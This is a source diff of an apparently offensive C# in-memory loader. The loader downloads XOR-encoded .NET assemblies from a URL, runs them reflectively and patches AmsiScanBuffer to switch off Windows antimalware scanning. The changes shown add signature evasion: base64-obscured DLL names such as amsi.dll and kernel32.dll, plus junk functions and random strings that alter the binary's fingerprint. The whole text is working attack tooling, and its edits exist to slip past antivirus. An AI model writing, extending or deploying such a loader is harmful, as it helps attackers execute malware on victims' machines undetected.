@@ -27,7 +27,7 @@ using Microsoft.Build.Utilities;
 
 public class MyNetLoader
 {
-
+    
     public static IntPtr GetLoadedModuleAddress(string DLLName)
     {
         ProcessModuleCollection ProcModules = Process.GetCurrentProcess().Modules;
@@ -135,9 +135,9 @@ public class MyNetLoader
 
     [UnmanagedFunctionPointer(CallingConvention.StdCall)]
     public delegate IntPtr LoadLibrary(string LiodermiaGranulater);
-
+    
     private static object[] globalArgs = null;
-
+   
     public static void Main(string[] args)
     {
 
@@ -246,12 +246,13 @@ public class MyNetLoader
         Console.WriteLine("\t-args: Optionnal parameter used to pass arguments to the loaded binary. Must be followed by all arguments for the binary.");
 
     }
-
+    
     private static Assembly loadASM(byte[] byteArray)
     {
-        return Assembly.Load(byteArray);
+        byte[] aux = byteArray.ToArray();
+        return Assembly.Load(aux);   
     }
-
+    
     private static byte[] readLocalFilePath(string filePath, FileMode fileMode)
     {
         byte[] buffer = null;
@@ -288,10 +289,24 @@ public class MyNetLoader
         return Convert.FromBase64String("uFcAB4DD");
     }
 
+    public static string RandomString(int length)
+    {
+        Random random = new Random();
+        const string chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
+        return new string(Enumerable.Repeat(chars, length)
+            .Select(s => s[random.Next(s.Length)]).ToArray());
+    }
+
     private static Type junkFunction(MethodInfo methodInfo)
     {
         return methodInfo.ReflectedType;
     }
+
+    private static String junkFunction2()
+    {
+        return RandomString(8);
+    }
+    
     private static object invokeCSharpMethod(MethodInfo methodInfo)
     {
         if (junkFunction(methodInfo) == methodInfo.ReflectedType)
@@ -299,29 +314,29 @@ public class MyNetLoader
         Console.ReadLine();
         return globalArgs[0];
     }
-
+    
     private static byte[] downloadURL(string url)
     {
         HttpWebRequest myRequest = (HttpWebRequest)WebRequest.Create(url);
-        myRequest.Proxy.Credentials = CredentialCache.DefaultCredentials;
-        myRequest.Method = "GET";
+        junkFunction2();
         WebResponse myResponse = myRequest.GetResponse();
         MemoryStream ms = new MemoryStream();
         myResponse.GetResponseStream().CopyTo(ms);
         return ms.ToArray();
     }
-
+    
     public static int setProtocolTLS(int secProt)
     {
         ServicePointManager.SecurityProtocol = (SecurityProtocolType)secProt;
         return secProt;
     }
+    
     private static MethodInfo getEntryPoint(Assembly asm)
     {
 
         return asm.EntryPoint;
     }
-
+    
     private static void TriggerPayload(string payloadPathOrURL, string[] inputArgs, bool xorEncoded, string xorKey, int setProtType = 0)
     {
         setProtocolTLS(setProtType);
@@ -354,7 +369,7 @@ public class MyNetLoader
     private static void encDeploy(byte[] data, string xorKey)
     {
 
-        invokeCSharpMethod(getEntryPoint(loadASM(xorEncDec(data, xorKey))));
+       invokeCSharpMethod(getEntryPoint(loadASM(xorEncDec(data, xorKey))));
 
     }
 
@@ -364,7 +379,7 @@ public class MyNetLoader
         invokeCSharpMethod(getEntryPoint(loadASM(data)));
 
     }
-
+    
     private static IntPtr unProtect(IntPtr amsiLibPtr)
     {
 
@@ -383,19 +398,19 @@ public class MyNetLoader
         }
 
     }
-
+    
     private static IntPtr getAMSILocation()
     {
         //GetProcAddress
-        IntPtr pGetProcAddress = GetLibraryAddress("kernel32.dll", FromB64("R2V0UHJvY0FkZHJlc3M="));
-        IntPtr pLoadLibrary = GetLibraryAddress("kernel32.dll", FromB64("TG9hZExpYnJhcnlB"));
+        IntPtr pGetProcAddress = GetLibraryAddress(FromB64("a2VybmVsMzIuZGxs"), FromB64("R2V0UHJvY0FkZHJlc3M="));
+        IntPtr pLoadLibrary = GetLibraryAddress(FromB64("a2VybmVsMzIuZGxs"), FromB64("TG9hZExpYnJhcnlB"));
 
         GetProcAddress fGetProcAddress = (GetProcAddress)Marshal.GetDelegateForFunctionPointer(pGetProcAddress, typeof(GetProcAddress));
         LoadLibrary fLoadLibrary = (LoadLibrary)Marshal.GetDelegateForFunctionPointer(pLoadLibrary, typeof(LoadLibrary));
 
-        return fGetProcAddress(fLoadLibrary("amsi.dll"), FromB64("QW1zaVNjYW5CdWZmZXI="));
+        return fGetProcAddress(fLoadLibrary(FromB64("YW1zaS5kbGw=")), FromB64("QW1zaVNjYW5CdWZmZXI="));
     }
-
+    
     private static void PathAMSI()
     {
 
@@ -431,7 +446,7 @@ public class MyNetLoader
 
 
     }
-
+    
     private static String FromB64(String b64)
     {
         return Encoding.UTF8.GetString(Convert.FromBase64String(b64));
